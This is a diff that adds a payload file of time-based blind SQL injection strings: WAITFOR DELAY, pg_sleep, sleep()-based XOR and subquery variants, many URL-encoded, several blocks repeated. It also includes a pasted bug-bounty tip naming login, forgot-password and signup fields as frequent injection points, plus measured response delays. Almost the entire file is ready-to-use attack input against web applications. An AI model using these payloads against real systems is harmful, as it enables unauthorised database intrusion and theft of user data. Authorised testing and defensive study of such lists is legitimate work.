@@ -1,0 +1,98 @@
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+' WAITFOR DELAY '0:0:5'--
+';WAITFOR DELAY '0:0:5'--
+';%20IF%20(1=2)%20WAITFOR DELAY%20'0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+'||pg_sleep(10)--
+1' OR NOT 2470=2470--
+'))%20or%20sleep(5)='
+;waitfor%20delay%20'0:0:5'--%20-+
+);waitfor%20delay%20'0:0:5'--
+';waitfor%20delay%20'0:0:5'--
+";waitfor%20delay%20'0:0:5'--
+');waitfor%20delay%20'0:0:5'--
+");waitfor%20delay%20'0:0:5'--
+));waitfor%20delay%20'0:0:5'--
+'%20WAITFOR%20DELAY%20'0:0:5'--
+'%3bWAITFOR%20DELAY%20'0:0:5'--
+'%3b%20IF%20(1=2)%20WAITFOR%20DELAY%20'0:0:10'--
+'%3b%20IF%20(1=1)%20WAITFOR%20DELAY%20'0:0:10'--
+'||pg_sleep(10)--
+1'%20OR%20NOT%202470=2470--
+
+#bugbountytips #bugbountytip #tip
+90% from my finds in SQL injection as
+ [POST Request] 
+ 1 Login page in username parameter 
+ 2 Forget password page username parameter
+ 3 Singup Page firstname and last name parameter
+' WAITFOR DELAY '0:0:5'--
+';WAITFOR%20DELAY%20'0:0:5'-- 
+===>Comment https://t.co/CO4Izh48gQ
+
+
+"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.508
+0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.543
+0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.523
+0"XOR(if(now()=sysdate(),sleep(6),0))XOR”Z => 6.565
+0"XOR(if(now()=sysdate(),sleep(3),0))XOR”Z => 3.518
+0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.502
+0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.491
+0"XOR(if(now()=sysdate(),sleep(6),0))XOR”Z => 6.508
+0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.695
+
+(select(0)from(select(sleep(13)))v)/*'+(select(0)from(select(sleep(13)))v)+'\"+(select(0)from(select(sleep(13)))v)+\"*/
+
+'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z 
+'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z-- -+
+'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z--%20-+
+'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z%23
+'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z#
+1%27/**/%256fR/**/50%2521%253D%253B%2523
+
+'+(select*from(select(sleep(20)))a)+'
+
+'%20AND%20(SELECT%206337%20FROM%20(SELECT(SLEEP(5)))cWqm)%20AND%20'CKzo'='CKzo
+
+--------------------------------------------------------------------
+latest:
+"%20AND%20(SELECT%205818%20FROM%20(SELECT(SLEEP(5)))jjKn)-- 
+
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+' WAITFOR DELAY '0:0:5'--
+';WAITFOR DELAY '0:0:5'--
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+'||pg_sleep(10)--
+1' OR NOT 2470=2470--
+"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.508
+0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.543
+0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.523
+0"XOR(if(now()=sysdate(),sleep(6),0))XOR”Z => 6.565
+0"XOR(if(now()=sysdate(),sleep(3),0))XOR”Z => 3.518
+0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.502
+0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.491
+0"XOR(if(now()=sysdate(),sleep(6),0))XOR”Z => 6.508
+0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.695
+(select(0)from(select(sleep(13)))v)/*'+(select(0)from(select(sleep(13)))v)+'\"+(select(0)from(select(sleep(13)))v)+\"*/
+'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z 
+'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z-- -+
+'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z--%20-+
+'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z%23
+'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z#
+1%27/**/%256fR/**/50%2521%253D%253B%2523
+'+(select*from(select(sleep(20)))a)+'
